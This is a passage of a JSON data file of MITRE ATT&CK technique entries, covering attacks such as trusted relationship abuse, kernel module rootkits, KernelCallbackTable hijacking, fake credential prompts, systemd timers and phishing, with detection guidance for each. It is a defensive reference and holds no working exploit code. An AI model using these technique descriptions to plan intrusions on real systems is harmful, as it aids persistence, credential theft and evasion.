      "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",
      "tactic": "initial-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1199",
      "stix_id": "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-15T23:17:12.008000+00:00",
      "platforms": [
        "Windows",
        "SaaS",
        "IaaS",
        "Linux",
        "macOS",
        "Identity Provider",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation",
        "Logon Session: Logon Session Metadata",
        "Network Traffic: Network Traffic Content",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "Establish monitoring for activity conducted by second and third party providers and other trusted entities that may be leveraged as a means to gain access to the network. Depending on the type of relationship, an adversary may have access to significant amounts of information about the target before conducting an operation, especially if the trusted relationship is based on IT services. Adversaries may be able to act quickly towards an objective, so proper monitoring for behavior related to Credential Access, Lateral Movement, and Collection will be important to detect the intrusion."
    },
    "T1136.003": {
      "id": "T1136.003",
      "name": "Cloud Account",
      "description": "Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users)\n\nIn addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment.(Citation: Microsoft Entra ID Service Principals) In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005).(Citation: GCP Service Accounts) While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.(Citation: AWS Instance Profiles)(Citation: AWS Lambda Execution Role)\n\nAdversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.\n\nOnce an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) or assigning [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1136.003",
      "stix_id": "attack-pattern--a009cb25-4801-4116-9105-80a91cf15c1b",
      "created": "2020-01-29T17:32:30.711000+00:00",
      "modified": "2025-04-15T22:01:16.589000+00:00",
      "platforms": [
        "IaaS",
        "SaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Creation"
      ],
      "defense_bypassed": [],
      "detection": "Collect usage logs from cloud user and administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins."
    },
    "T1069.001": {
      "id": "T1069.001",
      "name": "Local Groups",
      "description": "Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1069.001",
      "stix_id": "attack-pattern--a01bf75f-00b2-4568-a58f-565ff9bf202b",
      "created": "2020-03-12T19:29:21.013000+00:00",
      "modified": "2025-04-15T22:46:25.458000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Process: Process Creation",
        "Group: Group Enumeration",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
    },
    "T1593": {
      "id": "T1593",
      "name": "Search Open Websites/Domains",
      "description": "Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.(Citation: Cyware Social Media)(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)\n\nAdversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Phishing](https://attack.mitre.org/techniques/T1566)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1593",
      "stix_id": "attack-pattern--a0e6614a-7740-4b24-bd65-f1bde09fc365",
      "created": "2020-10-02T16:48:04.509000+00:00",
      "modified": "2025-04-15T23:04:23.505000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1098": {
      "id": "T1098",
      "name": "Account Manipulation",
      "description": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1098",
      "stix_id": "attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27",
      "created": "2017-05-31T21:31:12.196000+00:00",
      "modified": "2025-04-15T19:58:54.718000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS",
        "SaaS",
        "Network Devices",
        "Containers",
        "Office Suite",
        "Identity Provider",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation",
        "Active Directory: Active Directory Object Modification",
        "File: File Modification",
        "Group: Group Modification",
        "User Account: User Account Modification"
      ],
      "defense_bypassed": [],
      "detection": "Collect events that correlate with changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670.(Citation: Microsoft User Modified Event)(Citation: Microsoft Security Event 4670)(Citation: Microsoft Security Event 4670) Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ(Citation: InsiderThreat ChangeNTLM July 2017) or that include additional flags such as changing a password without knowledge of the old password.(Citation: GitHub Mimikatz Issue 92 June 2017)\n\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.\n\nMonitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078)"
    },
    "T1048": {
      "id": "T1048",
      "name": "Exfiltration Over Alternative Protocol",
      "description": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques)\n\nMany IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009).",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1048",
      "stix_id": "attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776",
      "created": "2017-05-31T21:30:44.720000+00:00",
      "modified": "2025-04-15T19:58:54.894000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "SaaS",
        "IaaS",
        "Network Devices",
        "Office Suite",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Cloud Storage: Cloud Storage Access",
        "Network Traffic: Network Traffic Flow",
        "Command: Command Execution",
        "Network Traffic: Network Traffic Content",
        "Application Log: Application Log Content",
        "File: File Access",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)"
    },
    "T1547.006": {
      "id": "T1547.006",
      "name": "Kernel Modules and Extensions",
      "description": "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming)\u00a0\n\nWhen used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide)\u00a0Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS)\n\nSince macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)\n\nAdversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1547.006",
      "stix_id": "attack-pattern--a1b52199-c8c5-438a-9ded-656f1d0888c6",
      "created": "2020-01-24T17:42:23.339000+00:00",
      "modified": "2025-04-15T19:58:54.982000+00:00",
      "platforms": [
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Creation",
        "File: File Modification",
        "Kernel: Kernel Module Load",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Loading, unloading, and manipulating modules on Linux systems can be detected by monitoring for the following commands: <code>modprobe</code>, <code>insmod</code>, <code>lsmod</code>, <code>rmmod</code>, or <code>modinfo</code> (Citation: Linux Loadable Kernel Module Insert and Remove LKMs) LKMs are typically loaded into <code>/lib/modules</code> and have had the extension .ko (\"kernel object\") since version 2.6 of the Linux kernel. (Citation: Wikipedia Loadable Kernel Module)\n\nAdversaries may run commands on the target system before loading a malicious module in order to ensure that it is properly compiled. (Citation: iDefense Rootkit Overview) Adversaries may also execute commands to identify the exact version of the running Linux kernel and/or download multiple versions of the same .ko (kernel object) files to use the one appropriate for the running system.(Citation: Trend Micro Skidmap) Many LKMs require Linux headers (specific to the target kernel) in order to compile properly.\u00a0These are typically obtained through the operating systems package manager and installed like a normal package. On Ubuntu and Debian based systems this can be accomplished by running: <code>apt-get install linux-headers-$(uname -r)</code> On RHEL and CentOS based systems this can be accomplished by running: <code>yum install kernel-devel-$(uname -r)</code>\n\nOn macOS, monitor for execution of <code>kextload</code> commands and user installed kernel extensions performing abnormal and/or potentially malicious activity (such as creating network connections). Monitor for new rows added in the <code>kext_policy</code> table. KextPolicy stores a list of user approved (non Apple) kernel extensions and a partial history of loaded kernel modules in a SQLite database, <code>/var/db/SystemPolicyConfiguration/KextPolicy</code>.(Citation: User Approved Kernel Extension Pike\u2019s)(Citation: Purves Kextpocalypse 2)(Citation: Apple Developer Configuration Profile)\n"
    },
    "T1056.002": {
      "id": "T1056.002",
      "name": "GUI Input Capture",
      "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1056.002",
      "stix_id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
      "created": "2020-02-11T18:58:45.908000+00:00",
      "modified": "2025-04-15T22:37:16.582000+00:00",
      "platforms": [
        "macOS",
        "Windows",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Script: Script Execution",
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor process execution for unusual programs as well as malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) that could be used to prompt users for credentials. For example, command/script history including abnormal parameters (such as requests for credentials and/or strings related to creating password prompts) may be malicious.(Citation: Spoofing credential dialogs) \n\nInspect and scrutinize input prompts for indicators of illegitimacy, such as non-traditional banners, text, timing, and/or sources. "
    },
    "T1588.002": {
      "id": "T1588.002",
      "name": "Tool",
      "description": "Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019)\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1588.002",
      "stix_id": "attack-pattern--a2fdce72-04b2-409a-ac10-cc1695f4fce0",
      "created": "2020-10-01T02:08:33.977000+00:00",
      "modified": "2025-04-15T23:16:21.007000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Malware Repository: Malware Metadata"
      ],
      "defense_bypassed": [],
      "detection": "In some cases, malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks in [Cobalt Strike](https://attack.mitre.org/software/S0154) payloads.(Citation: Analyzing CS Dec 2020)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle."
    },
    "T1052.001": {
      "id": "T1052.001",
      "name": "Exfiltration over USB",
      "description": "Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1052.001",
      "stix_id": "attack-pattern--a3e1e6c5-9c74-4fc0-a16c-a9d228c17829",
      "created": "2020-03-11T13:50:11.467000+00:00",
      "modified": "2025-04-15T19:58:55.347000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Drive: Drive Creation",
        "File: File Access",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor file access on removable media. Detect processes that execute when removable media are mounted."
    },
    "T1574.013": {
      "id": "T1574.013",
      "name": "KernelCallbackTable",
      "description": "Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.(Citation: Windows Process Injection KernelCallbackTable)\n\nAn adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.\n\nA pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT January 2022)\n\nThe tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1574.013",
      "stix_id": "attack-pattern--a4657bc9-d22f-47d2-a7b7-dd6ec33f3dde",
      "created": "2022-02-25T15:27:44.927000+00:00",
      "modified": "2025-04-15T22:43:44.231000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious behaviors that could relate to post-compromise behavior.\n\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances. for known bad sequence of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>WriteProcessMemory()</code> and <code>NtQueryInformationProcess()</code> with the parameter set to <code>ProcessBasicInformation</code> may be used for this technique.(Citation: Lazarus APT January 2022)"
    },
    "T1597": {
      "id": "T1597",
      "name": "Search Closed Sources",
      "description": "Adversaries may search and gather information about victims from closed (e.g., paid, private, or otherwise not freely available) sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.(Citation: ZDNET Selling Data)\n\nAdversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1597",
      "stix_id": "attack-pattern--a51eb150-93b1-484b-a503-e51453b127a4",
      "created": "2020-10-02T17:01:42.558000+00:00",
      "modified": "2025-04-15T23:03:31.068000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1053.006": {
      "id": "T1053.006",
      "name": "Systemd Timers",
      "description": "Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: Systemd Remote Control)\n\nEach <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.\n\nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.(Citation: Falcon Sandbox smp: 28553b3a9d)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1053.006",
      "stix_id": "attack-pattern--a542bac9-7bc1-4da7-9a09-96f69e23cc21",
      "created": "2020-10-12T17:50:31.584000+00:00",
      "modified": "2025-04-15T19:58:55.648000+00:00",
      "platforms": [
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Process: Process Creation",
        "Command: Command Execution",
        "Scheduled Job: Scheduled Job Creation"
      ],
      "defense_bypassed": [],
      "detection": "Systemd timer unit files may be detected by auditing file creation and modification events within the <code>/etc/systemd/system</code>, <code>/usr/lib/systemd/system/</code>, and <code>~/.config/systemd/user/</code> directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of \u2018systemd\u2019, a parent process ID of 1, and will usually execute as the \u2018root\u2019 user.\n\nSuspicious systemd timers can also be identified by comparing results against a trusted system baseline. Malicious systemd timers may be detected by using the systemctl utility to examine system wide timers: <code>systemctl list-timers \u2013all</code>. Analyze the contents of corresponding <code>.service</code> files present on the file system and ensure that they refer to legitimate, expected executables.\n\nAudit the execution and command-line arguments of the 'systemd-run' utility as it may be used to create timers.(Citation: archlinux Systemd Timers Aug 2020)"
    },
    "T1566": {
      "id": "T1566",
      "name": "Phishing",
      "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by [Email Spoofing](https://attack.mitre.org/techniques/T1672)(Citation: Proofpoint-spoof) the identity of the sender, which can be used to fool both the human recipient as well as automated security tools,(Citation: cyberproof-double-bounce) or by including the intended target as a party to an existing email thread that includes malicious files or links (i.e., \"thread hijacking\").(Citation: phishing-krebs)\n\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)",
      "tactic": "initial-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1566",
      "stix_id": "attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b",
      "created": "2020-03-02T18:45:07.892000+00:00",
      "modified": "2025-04-15T19:58:55.739000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "SaaS",
        "Identity Provider",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Network Traffic: Network Traffic Flow",
        "Application Log: Application Log Content",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Network intrusion detection systems and email gateways can be used to detect phishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nURL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.\n\nBecause most common third-party services used for phishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Many possible detections of follow-on behavior may take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs."
    },
    "T1542.004": {
      "id": "T1542.004",
      "name": "ROMMONkit",
      "description": "Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation: Cisco Blog Legacy Device Attacks)\n\n\nROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1542.004",
      "stix_id": "attack-pattern--a6557c75-798f-42e4-be70-ab4502e0a3bc",
      "created": "2020-10-20T00:05:48.790000+00:00",
      "modified": "2025-04-25T14:47:36.549000+00:00",
      "platforms": [
        "Network Devices"
      ],
